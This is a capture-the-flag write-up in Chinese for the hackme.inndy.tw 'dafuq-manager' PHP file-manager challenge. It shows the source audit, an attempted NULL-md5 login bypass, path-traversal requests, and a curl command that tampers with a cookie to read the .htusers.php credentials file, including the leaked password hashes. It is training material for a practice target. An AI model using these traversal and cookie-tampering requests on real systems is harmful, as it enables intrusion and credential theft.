@@ -1,0 +1,241 @@
+Try to login as admin! and you will get flag2
+==========================================================
+guest权限拿到源码
+dafuqManager.7z
+==========================================================
+可以看到有两个用户guest inndy的界面
+afuqManager/data/guest
+afuqManager/data/inndy
+curl https://dafuq-manager.hackme.inndy.tw/data/guest/
+Hello, World	Guest's Room
+curl https://dafuq-manager.hackme.inndy.tw/data/inndy/
+Nothing Here, This is normal account, please hack admin's account.
+==========================================================
+代码审计
+#./core/login.php
+$p_pass = $GLOBALS['__POST']["p_pass"]
+if (!activate_user(stripslashes($GLOBALS['__POST']["p_user"]), md5(stripslashes($p_pass)))) {
+	logout();
+}
+#./core/fun_users
+<?php
+function load_users() {
+    require "./.config/.htusers.php";
+}
+function &find_user($user, $pass) {
+    $cnt = count($GLOBALS["users"]);
+    for ($i = 0;$i < $cnt;++$i) {
+        if ($user == $GLOBALS["users"][$i][0]) {
+            if ($pass == NULL || ($pass == $GLOBALS["users"][$i][1] && $GLOBALS["users"][$i][7])) {
+                return $GLOBALS["users"][$i];
+            }
+        }
+    }
+    return NULL;
+}
+function activate_user($user, $pass) {
+    $data = find_user($user, $pass);
+    if ($data == NULL) return false;
+    $GLOBALS['__SESSION']["s_user"] = $data[0];
+    $GLOBALS['__SESSION']["s_pass"] = $data[1];
+    $GLOBALS["home_dir"] = $data[2];
+    $GLOBALS["home_url"] = $data[3];
+    $GLOBALS["show_hidden"] = $data[4];
+    $GLOBALS["no_access"] = $data[5];
+    $GLOBALS["permissions"] = $data[6];
+    return true;
+}
+#./.config/.htusers.php
+<?php
+$GLOBALS["users"] = array(
+    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://game1.security.ntu.st/data/guest", 0, "^.ht", 1, 1),
+);
+
+==========================================================
+#尝试认证绕过
+需要$GLOBALS['__POST']["p_user"]="admin"
+md5(stripslashes($p_pass))==NULL
+
+<?php
+$b=[1,2];
+var_dump(stripslashes($b));			NULL
+var_dump(md5($b));					NULL
+var_dump(md5(stripslashes($b)));	d41d8cd98f00b204e9800998ecf8427e
+var_dump(md5(""));					d41d8cd98f00b204e9800998ecf8427e
+
+
+https://stackoverflow.com/questions/66522263/php-when-md5-returns-null-value
+==========================================================
+一共具有的功能
+require "./core/init.php";
+switch ($GLOBALS["action"]) {
+        // EDIT FILE
+        
+    case "edit":
+        require "./core/fun_edit.php";
+        edit_file($GLOBALS["dir"], $GLOBALS["item"]);
+    break;
+        // DELETE FILE(S)/DIR(S)
+        
+    case "delete":
+        require "./core/fun_del.php";
+        del_items($GLOBALS["dir"]);
+    break;
+        // COPY/MOVE FILE(S)/DIR(S)
+        
+    case "copy":
+    case "move":
+        require "./core/fun_copy_move.php";
+        copy_move_items($GLOBALS["dir"]);
+    break;
+        // DOWNLOAD FILE
+        
+    case "download":
+        ob_start(); // prevent unwanted output
+        require "./core/fun_down.php";
+        ob_end_clean(); // get rid of cached unwanted output
+        download_item($GLOBALS["dir"], $GLOBALS["item"]);
+        ob_start(false); // prevent unwanted output
+        exit;
+    break;
+        // UPLOAD FILE(S)
+        
+    case "upload":
+        require "./core/fun_up.php";
+        upload_items($GLOBALS["dir"]);
+    break;
+        // CREATE DIR/FILE
+        
+    case "mkitem":
+        require "./core/fun_mkitem.php";
+        make_item($GLOBALS["dir"]);
+    break;
+        // CHMOD FILE/DIR
+        
+    case "chmod":
+        require "./core/fun_chmod.php";
+        chmod_item($GLOBALS["dir"], $GLOBALS["item"]);
+    break;
+        // SEARCH FOR FILE(S)/DIR(S)
+        
+    case "search":
+        require "./core/fun_search.php";
+        search_items($GLOBALS["dir"]);
+    break;
+        // CREATE ARCHIVE
+        
+    case "arch":
+        require "./core/fun_archive.php";
+        archive_items($GLOBALS["dir"]);
+    break;
+        // USER-ADMINISTRATION
+        
+    case "admin":
+        require "./core/fun_admin.php";
+        show_admin($GLOBALS["dir"]);
+    break;
+    case "debug":
+        require "./core/fun_debug.php";
+        do_debug($GLOBALS["dir"]);
+    break;
+        // DEFAULT: LIST FILES & DIRS
+        
+    case "list":
+    default:
+        require "./core/fun_list.php";
+        list_dir($GLOBALS["dir"]);
+} // end switch-statement
+==========================================================
+#尝试download ./.config/.htusers.php
+下载的目录在./data/guest
+https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=../../.config/.htusers.php
+#0  show_error(.htusers.php: This file doesn't exist.) called at [/var/www/webhdisk/core/fun_down.php:6]
+#1  download_item(, .htusers.php) called at [/var/www/webhdisk/index.php:34]
+
+
+#./core/login.php
+case "download":
+	ob_start(); // prevent unwanted output
+	require "./core/fun_down.php";
+	ob_end_clean(); // get rid of cached unwanted output
+	download_item($GLOBALS["dir"], $GLOBALS["item"]);
+	ob_start(false); // prevent unwanted output
+	exit;
+#./core/fun_down.php
+require_once ('core/secure.php');	
+function download_item($dir, $item) {
+    $item = basename($item);
+    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
+    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
+	
+basename() 函数返回路径中的文件名部分.
+
+尝试
+https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=.htusers.php&dir=../../.config/
+#0  show_error(../../.config/ : The current directory may not be above the home directory.) called at [/var/www/webhdisk/core/init.php:65]
+#1  require(/var/www/webhdisk/core/init.php) called at [/var/www/webhdisk/index.php:7]
+#./core/init.php
+$abs_dir = get_abs_dir($GLOBALS["dir"]);
+if (!down_home($abs_dir)) show_error($GLOBALS["dir"] . " : " . $GLOBALS["error_msg"]["abovehome"]);
+
+
+#./core/fun_extra.php
+function down_home($abs_dir) {
+    $real_home = @realpath($GLOBALS["home_dir"]);
+    $real_dir = @realpath($abs_dir);
+    if ($real_home === false || $real_dir === false) {
+        if (@eregi("\\.\\.", $abs_dir)) return false;
+    } else if (strcmp($real_home, @substr($real_dir, 0, strlen($real_home)))) {
+        return false;
+    }
+    return true;
+}
+
+$GLOBALS["home_dir"]=./data/guest
+realpath() 函数返回绝对路径.
+该函数删除所有符号连接（比如 '/./', '/../' 以及多余的 '/'）,返回绝对路径名.
+
+==========================================================
+#尝试edit ./.config/.htusers.php
+https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php
+#0  show_error(../../.config/.htusers.php: You are not allowed to access this file.) called at [/var/www/webhdisk/core/fun_edit.php:18]
+#1  edit_file(, ../../.config/.htusers.php) called at [/var/www/webhdisk/index.php:13]
+
+
+#./core/fun_edit.php
+function edit_file($dir, $item) {
+    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
+    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
+    if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
+    $fname = get_abs_item($dir, $item);
+#./core/fun_extra.php
+function get_show_item($dir, $item) {
+    if ($item == "." || $item == "..") return false;
+    if ($_COOKIE['help'] == 'me') {
+        $_COOKIE['help'] = null;
+        setcookie('help', '', time() - 9999999999);
+        echo '<script>alert("Very good. You know how to create cookie. How about tamper a cookie?")</script>';
+    }
+    if (empty($_COOKIE['show_hidden'])) {
+        setcookie('show_hidden', 'no', time() + 3600);
+    }
+    if (substr($item, 0, 1) == "." && $GLOBALS["show_hidden"] == false && $_COOKIE['show_hidden'] != 'yes') return false;
+    if ($GLOBALS["no_access"] != "" && @eregi($GLOBALS["no_access"], $item)) return false;
+    if ($GLOBALS["show_hidden"] == false) {
+        $dirs = explode("/", $dir);
+        foreach ($dirs as $i) if (substr($i, 0, 1) == ".") return false;
+    }
+    return true;
+}
+
+curl 'https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php' --header 'Cookie: show_hidden=yes; PHPSESSID=2mrs6n2uf361e4k287al8bru33'
+
+<?php
+$GLOBALS["users"] = array(
+    array("adm1n15trat0r", "34af0d074b17f44d1bb939765b02776f", "./data", "https://dafuq-manager.hackme.inndy.tw/data", 1, "^.ht", 7, 1),
+    array("inndy", "fc5e038d38a57032085441e7fe7010b0", "./data/inndy", "https://dafuq-manager.hackme.inndy.tw/data/inndy", 0, "^.ht", 1, 1),
+    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://dafuq-manager.hackme.inndy.tw/data/guest", 0, "^.ht", 1, 1),
+);
+==========================================================
+flag 提示
+For flag3, you need a shell to get that. see $WEBROOT/flag3!
